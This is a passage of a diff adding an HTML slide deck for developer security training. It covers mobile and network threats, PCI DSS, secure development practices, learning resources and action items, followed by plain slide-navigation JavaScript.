+                    <li><strong>Prime targets:</strong> Store banking, corporate email, authentication apps, personal data</li>
+                    <li><strong>Malicious apps:</strong> Trojanized software steals credentials, spies, tracks location</li>
+                    <li><strong>Public WiFi:</strong> Enable MITM attacks, intercept passwords and session tokens</li>
+                    <li><strong>Lost devices:</strong> Physical access exposes VPN, photos, passwords, 2FA apps</li>
+                    <li><strong>OS vulnerabilities:</strong> Zero-day exploits and spyware like Pegasus</li>
+                </ul>
+                <div class="compact-list">
+                    <strong>Mobile Threats:</strong>
+                    <span class="highlight">Smishing</span> • <span class="highlight">Malicious QR Codes</span> • <span class="highlight">App Store Malware</span> • <span class="highlight">SIM Swapping</span> • <span class="highlight">Juice Jacking</span>
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 14 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 16: Network Security -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/cyber-security-modem-safe-internet-connection-22958.png" alt="Network" class="header-icon">
+                <h1 class="slide-title">Network Security</h1>
+            </div>
+            <div class="slide-content">
+                <div class="two-column">
+                    <div class="column">
+                        <h3>
+                            <img src="Icons/cyber-security-secure-data-connection-22933.png" alt="Secure">
+                            Protection Measures
+                        </h3>
+                        <ul>
+                            <li><strong>HTTPS/TLS encryption</strong> - protects data in transit, prevents eavesdropping</li>
+                            <li><strong>VPN</strong> - encrypted tunnel for untrusted networks</li>
+                            <li><strong>Strong cipher suites</strong> - AES-256, ChaCha20</li>
+                            <li><strong>Certificate validation</strong> - verify SSL/TLS certificates</li>
+                            <li><strong>Network segmentation</strong> - isolate critical systems</li>
+                        </ul>
+                    </div>
+                    <div class="column">
+                        <h3>
+                            <img src="Icons/cyber-security-ddos-attack-warning-22973.png" alt="Threats">
+                            Network Threats
+                        </h3>
+                        <ul>
+                            <li><strong>MITM</strong> - intercepts communication between parties</li>
+                            <li><strong>DNS Hijacking</strong> - redirects domains to malicious servers</li>
+                            <li><strong>Session Hijacking</strong> - steals session tokens</li>
+                            <li><strong>Packet Sniffing</strong> - captures unencrypted traffic</li>
+                            <li><strong>Evil Twin WiFi</strong> - fake access points</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 15 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 17: Payment Security -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/secure-payment-with-credit-card-18407.png" alt="Payment" class="header-icon">
+                <h1 class="slide-title">Payment Card Security</h1>
+            </div>
+            <div class="slide-content">
+                <ul>
+                    <li><strong>PCI DSS (Payment Card Industry Data Security Standard):</strong> Mandatory security framework with 12 requirements for any organization storing, processing, or transmitting cardholder data</li>
+                    <li><strong>Never store prohibited data:</strong> CVV/CVC codes (3-4 digit security codes) are explicitly prohibited from storage, full magnetic stripe data, and PIN numbers must never be retained after authorization</li>
+                    <li><strong>Tokenization:</strong> Replace sensitive card data with non-sensitive equivalents (tokens) that are meaningless to attackers if stolen and can only be used within specific contexts</li>
+                    <li><strong>Use payment processors:</strong> Services like Stripe, PayPal, Square, and Braintree handle PCI compliance, reducing your scope and liability significantly</li>
+                    <li><strong>Encryption requirements:</strong> All cardholder data must be encrypted in transit (TLS 1.2+) and at rest using strong cryptography (AES-256) with proper key management</li>
+                    <li><strong>3D Secure authentication:</strong> Additional verification layer (Verified by Visa, Mastercard SecureCode) reduces fraud liability by confirming cardholder identity</li>
+                </ul>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 16 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 18: Security Best Practices -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/artificial-intelligence-security-shield-22133.png" alt="Best Practices" class="header-icon">
+                <h1 class="slide-title">Security Best Practices</h1>
+            </div>
+            <div class="slide-content">
+                <div class="icon-grid">
+                    <div class="icon-item">
+                        <img src="Icons/password-11942.png" alt="Passwords">
+                        <span>Strong Passwords</span>
+                    </div>
+                    <div class="icon-item">
+                        <img src="Icons/cyber-security-fingerprint-safety-shield-23030.png" alt="MFA">
+                        <span>Multi-Factor</span>
+                    </div>
+                    <div class="icon-item">
+                        <img src="Icons/cyber-security-secure-data-connection-22933.png" alt="Encryption">
+                        <span>Encryption</span>
+                    </div>
+                    <div class="icon-item">
+                        <img src="Icons/secure-1498.png" alt="Updates">
+                        <span>Updates</span>
+                    </div>
+                </div>
+                <ul>
+                    <li>Use 12+ character passwords with mixed case, numbers, symbols</li>
+                    <li>Enable MFA everywhere—prevents 99.9% of account compromises</li>
+                    <li>Keep all software updated—patches fix critical vulnerabilities</li>
+                </ul>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 17 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 19: Security Development -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/artificial-intelligence-security-shield-22133.png" alt="SDL" class="header-icon">
+                <h1 class="slide-title">Security Development Lifecycle</h1>
+            </div>
+            <div class="slide-content">
+                <ul>
+                    <li><strong>Threat Modeling:</strong> Identify risks during design phase</li>
+                    <li><strong>Secure Coding:</strong> Follow OWASP guidelines and best practices</li>
+                    <li><strong>Code Review:</strong> Peer review with security focus</li>
+                    <li><strong>Static Analysis:</strong> Automated vulnerability scanning</li>
+                    <li><strong>Penetration Testing:</strong> Ethical hackers test your defenses</li>
+                    <li><strong>Bug Bounties:</strong> Reward responsible disclosure</li>
+                </ul>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 18 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 20: Security Principles -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/cyber-security-system-network-22964.png" alt="Principles" class="header-icon">
+                <h1 class="slide-title">Core Security Principles</h1>
+            </div>
+            <div class="slide-content">
+                <ul>
+                    <li><strong>Defense in Depth:</strong> Multiple security layers ensure protection</li>
+                    <li><strong>Least Privilege:</strong> Grant minimum necessary permissions</li>
+                    <li><strong>Zero Trust:</strong> Never trust, always verify every request</li>
+                    <li><strong>Fail Secure:</strong> Systems should fail to secure state, not open</li>
+                    <li><strong>Security by Design:</strong> Built-in from start, not bolted on</li>
+                </ul>
+                <div class="warning-box">
+                    <span>Attackers need ONE vulnerability; defenders must protect ALL entry points</span>
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 19 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 21: Security Mindset -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/cyber-security-system-network-22964.png" alt="Mindset" class="header-icon">
+                <h1 class="slide-title">Developing Security Mindset</h1>
+            </div>
+            <div class="slide-content">
+                <ul>
+                    <li><strong>Think Like an Attacker:</strong> Ask "How would I break this?" during development</li>
+                    <li><strong>Security is a Process:</strong> Continuous assessment and improvement, not one-time fix</li>
+                    <li><strong>Stay Informed:</strong> Follow security blogs, CVE databases, vendor advisories</li>
+                    <li><strong>Regular Audits:</strong> Quarterly assessments, annual penetration tests</li>
+                    <li><strong>Security Culture:</strong> Everyone's responsibility, not just IT's job</li>
+                </ul>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 20 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 22: Key Takeaways -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/secure-1498.png" alt="Takeaways" class="header-icon">
+                <h1 class="slide-title">Key Takeaways</h1>
+            </div>
+            <div class="slide-content">
+                <ul>
+                    <li><strong>Never Trust User Input:</strong> Validate and sanitize all data—assume malicious intent</li>
+                    <li><strong>Prepared Statements:</strong> Use parameterized queries for all database operations</li>
+                    <li><strong>Output Encoding:</strong> Escape user content before displaying in HTML/JavaScript</li>
+                    <li><strong>Keep Updated:</strong> Patch software, frameworks, libraries, OS regularly</li>
+                    <li><strong>MFA Everywhere:</strong> Prevents 99.9% of account compromises</li>
+                    <li><strong>HTTPS Always:</strong> Encrypt all data in transit with TLS 1.3</li>
+                </ul>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 21 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 23: Resources -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/cyber-security-system-network-22964.png" alt="Resources" class="header-icon">
+                <h1 class="slide-title">Learning Resources</h1>
+            </div>
+            <div class="slide-content">
+                <div class="compact-list">
+                    <strong>Essential Security Resources:</strong>
+                    <span class="highlight">OWASP.org</span> - Top 10, Testing Guide, Cheat Sheets<br>
+                    <span class="highlight">portswigger.net</span> - Free Web Security Academy<br>
+                    <span class="highlight">nist.gov</span> - Cybersecurity Framework<br>
+                    <span class="highlight">sans.org</span> - Training & Certifications<br>
+                    <span class="highlight">cve.mitre.org</span> - Vulnerability Database
+                </div>
+                <div class="compact-list">
+                    <strong>Practice Platforms:</strong>
+                    TryHackMe • HackTheBox • DVWA • WebGoat • Juice Shop • CTF Competitions
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 22 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 24: Action Items -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/secure-1498.png" alt="Action" class="header-icon">
+                <h1 class="slide-title">Immediate Action Items</h1>
+            </div>
+            <div class="slide-content">
+                <ul>
+                    <li>Audit current applications for SQL injection and XSS vulnerabilities</li>
+                    <li>Implement prepared statements and output encoding where missing</li>
+                    <li>Add Content Security Policy headers to web applications</li>
+                    <li>Enable MFA on all critical accounts and systems</li>
+                    <li>Update third-party dependencies to latest secure versions</li>
+                    <li>Create/update incident response plan and conduct exercises</li>
+                    <li>Schedule penetration testing and vulnerability assessments</li>
+                    <li>Provide security training for entire development team</li>
+                </ul>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 23 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 25: Thank You -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/cyber-security-shield-padlock-black-outline-22822.png" alt="Thank You" class="header-icon">
+                <h1 class="slide-title">Thank You!</h1>
+            </div>
+            <div class="slide-content">
+                <div style="text-align: center; margin-top: 70px; padding: 35px; background: linear-gradient(135deg, #e94560 0%, #ff6b35 100%); color: #fff8e7; border: 4px solid #fdc500; box-shadow: 5px 5px 0px rgba(15, 52, 96, 0.3);">
+                    <div style="font-size: 44px; font-weight: bold; margin-bottom: 18px; text-shadow: 3px 3px 0px rgba(0, 0, 0, 0.3);">THANK YOU!</div>
+                    <div style="font-size: 22px; margin-top: 18px;">Questions? Discussion?</div>
+                    <div style="font-size: 17px; margin-top: 18px; opacity: 0.9;">Security is a journey, not a destination</div>
+                    <div style="font-size: 15px; margin-top: 25px; padding-top: 18px; border-top: 2px solid rgba(255, 255, 255, 0.3);">
+                        Stay Secure, Stay Vigilant
+                    </div>
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 24 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()" disabled>NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.slide');
+        const totalSlides = slides.length;
+        const progressBar = document.getElementById('progressBar');
+
+        function showSlide(n) {
+            slides[currentSlide].classList.remove('active');
+            currentSlide = (n + totalSlides) % totalSlides;
+            slides[currentSlide].classList.add('active');
+            updateProgress();
+        }
+
+        function nextSlide() {
+            if (currentSlide < totalSlides - 1) {
+                showSlide(currentSlide + 1);
+            }
+        }
+
+        function prevSlide() {
+            if (currentSlide > 0) {
+                showSlide(currentSlide - 1);
+            }
+        }
+
+        function updateProgress() {
+            const progress = ((currentSlide + 1) / totalSlides) * 100;
+            progressBar.style.width = progress + '%';
+        }
+
+        // Keyboard navigation
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowRight' || e.key === ' ') {
+                e.preventDefault();
+                nextSlide();
+            } else if (e.key === 'ArrowLeft') {
+                e.preventDefault();
+                prevSlide();
+            }
+        });
+
+        // Initialize
+        updateProgress();
+
+        // Print mode
+        window.addEventListener('beforeprint', () => {
+            slides.forEach(slide => {
+                slide.style.display = 'flex';
+                slide.style.pageBreakAfter = 'always';
+                slide.style.height = '100vh';
+            });
+        });
+
+        window.addEventListener('afterprint', () => {
+            slides.forEach((slide, index) => {
+                if (index !== currentSlide) {
+                    slide.style.display = 'none';
+                }
+                slide.style.pageBreakAfter = '';
+            });
+            slides[currentSlide].style.display = 'flex';
+        });
+    </script>
+</body>
+</html>
